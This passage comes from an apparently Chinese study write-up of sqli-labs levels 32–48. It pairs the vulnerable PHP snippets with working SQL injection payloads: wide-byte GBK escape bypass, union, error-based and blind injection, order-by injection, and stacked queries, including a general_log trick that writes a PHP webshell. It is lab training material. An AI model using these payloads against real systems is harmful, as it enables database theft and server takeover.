-1")+union+select+1,user(),database()--+
```

## less-32 宽字节注入

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);	//escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);	//escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);	//escape double quote with a backslash
    return $string;
}

// take the variables 
if(isset($_GET['id']))
{
$id=check_addslashes($_GET['id']);
    
// connectivity 
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
        if($row)
        {
        echo 'Your Login name:'. $row['username'];
        echo 'Your Password:' .$row['password'];
        }
        else 
        {
        print_r(mysql_error());
        }
}
else { 
	echo "Please input the ID as parameter with numeric value";
}
```

`mysql_query("SET NAMES gbk");`

设置 MySQL 数据库连接的字符集为 `gbk`

过滤单双引号和,\

> 在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；
>
> MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii>128才能达到汉字范围)；
>
> 在PHP中使用`addslashes`函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\”，变成%5c%27;
>
> 可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字;
>
> %5c被吃掉了，单引号由此逃逸可以用来闭合语句。
>
> **修复建议：**
>
> （1）使用mysqli_set_charset(GBK)指定字符集
>
> （2）使用mysqli_real_escape_string进行转义

![image-20241208172300391](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208172300391.png)

```
-1%df'+union+select+1,2,3--+
```

## less-33 addslashes

```
function check_addslashes($string)
{
    $string= addslashes($string);
    return $string;
}
```

使用的是php中的函数`addslashes`进行转义（单双引号和`\`）

> **addslashes**(string `$string`): string
>
> 返回需要在转义字符之前添加反斜线的字符串。这些字符是：    
>
> - 单引号（`'`）
> - 双引号（`"`）
> - 反斜线（`\`）
> - NUL（NUL 字节）

payload

```
-1%df'+union+select+1,2,3--+
```

## less-34

```php
$uname = addslashes($uname1);
$passwd= addslashes($passwd1);
//echo "username after addslashes is :".$uname ."<br>";
//echo "Input password after addslashes is : ".$passwd;    
// connectivity 
mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

post方式，两列

payload

```
uname=1%df'+union+select+database(),user()--+&passwd=2&submit=Submit
```

## less-35

```php
$id=check_addslashes($_GET['id']);
//echo "The filtered request is :" .$id . "<br>";
// connectivity 
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
```

数字型，直接注入

```
-1+union+select+1,2,3--+
```

## less-36 mysql_real_escape_string

```php
function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}

// take the variables 
if(isset($_GET['id']))
{
$id=check_quotes($_GET['id']);

// connectivity 
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
```

MySQL 注入天书这里介绍了一个新的方法

将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`

我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：

```shell
➜  ~ echo \'|iconv -f utf-8 -t utf-16
��'
➜  ~ echo \'|iconv -f utf-8 -t utf-32
��'
```

payload

```
�' or 1#
万能密码
�'+union+select+1,user(),3--+
```

## less-37

```php
$uname = mysql_real_escape_string($uname1);
$passwd= mysql_real_escape_string($passwd1);

//echo "username after addslashes is :".$uname ."<br>";
//echo "Input password after addslashes is : ".$passwd;    

// connectivity 
mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

post方式而已，方法和上面一样

payload

```
%EF%BF%BD%27+union+select+user(),database()%23
```

## less-38 堆叠注入

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '<font size = "5" color= "#00FF00">';
            printf("Your Username is : %s", $row[1]);
            echo "<br>";
            printf("Your Password is : %s", $row[2]);
            echo "<br>";
            echo "</font>";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}
else 
    {
        echo '<font size="5" color= "#FFFF00">';
        print_r(mysqli_error($con1));
        echo "</font>";  
    }
```

mysqli_multi_query 执行一个或多个由分号分隔的查询。 

可以执行多条sql语句

```
?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

```
-1';insert into users(id,username,password) values(15,'test','test');
```

但是不知道表结构，也没有用的

**日志写webshell**

直接用outfile写好像也行，`secure_file_priv`为空

```
show variables like '%general%';
set global general_log = "ON";
set global general_log_file='/var/www/html/shell.php'
select <?php phpinfo();?>
```

payload

```
?id=1';set global general_log = "ON";set global general_log_file='/var/www/html/shell.php';--+
?id=1';select <?php phpinfo();?>
```

这里写不进去（linux），用户是mysql，必须给mysql用户目录权限才能写

## less-39

数字型注入

payload

```
-1+union+select+1,database(),3;--+
```

## less-40

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

payload

```
-1')+union+select+1,database(),3;--+ 
```

## less-41

因为少了报错输出，所以这里不能报错注入

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

payload

```
-1+union+select+1,2,3--+
```

## less-42

```php
$username = mysqli_real_escape_string($con1, $_POST["login_user"]);
$password = $_POST["login_password"];

$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```

payload

```
login_user=1&login_password=1'and+updatexml(1,concat(0x7e,user()),1)--+
```

## less-43

```
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
```

闭合方式`')`

payload

```
login_user=admin&login_password=1')+-+updatexml(1,concat(0x7e,user()),1)+-('
```

## less-44

少了报错注入

```php
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```

payload

```
login_user=admin&login_password=1'+union+select+1,database(),3--+
```

## less-45

```
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
```

payload

```
login_user=admin&login_password=1')+union+select+1,database(),3--+&mysubmit=Login
```

## less-46 Order-By注入

> order by 注入是`SQL`注入中很常见的，被过滤的概率小；
>
> 可被用户控制的数据在order by 子句后边，即order参数可控
>
> **升序排序**（默认）：使用 `ORDER BY column_name ASC`，或者简单地 `ORDER BY column_name`。
>
> ```
> sql
> SELECT * FROM users ORDER BY last_name;
> ```
>
> 这将根据 `last_name` 列对用户进行升序排序。

```
$sql = "SELECT * FROM users ORDER BY $id";
```

不能使用union,使用报错注入

```
updatexml(1,concat(0x7e,(select+username+from+users+limit+3,1)),1)
extractvalue(1,concat(0x7e,(select+username+from+users+limit+3,1)))
```

## less-47

```
$sql = "SELECT * FROM users ORDER BY '$id'";
```

单引号闭合

payload

```
1'+and+extractvalue(1,concat(0x7e,(select+username+from+users+limit+3,1)))-'
```

## less-48

报错注入没了

```
$sql = "SELECT * FROM users ORDER BY $id";
```

使用盲注

```
rand () 验证
rand (ture) 和 rand (false) 的结果是不一样的

?sort=rand(true)
?sort=rand(false)
所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload
```

```
rand(ascii(left(database(),1))=115)
```

显示不一样

![image-20241210193510375](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241210193510375.png)

![image-20241210193528529](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241210193528529.png)

```
?sort=rand(if(ascii(substr(database(),1,1))>114,1,sleep(1)))
?sort=rand(if(ascii(substr(database(),1,1))>115,1,sleep(1)))
```

数据库第一个字母的 ascii 码为 115，即 `s`，114不延时，115延时

